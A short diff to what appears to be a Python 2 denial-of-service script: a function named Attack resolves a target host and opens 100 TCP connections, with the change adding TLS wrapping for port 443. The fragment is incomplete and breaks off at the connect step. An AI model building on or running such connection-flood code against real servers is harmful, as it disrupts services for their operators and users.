@@ -1,13 +1,18 @@
 import threading
 from datetime import datetime
 import socket
+import ssl
 
 def Attack(name, header, port):
     ip = socket.gethostbyname(name)
     
     print "X"
     for i in range(100):
+        
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if port==443:
+            s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+        
         try:
             s.connect((ip,port))
         except socket.error, v:
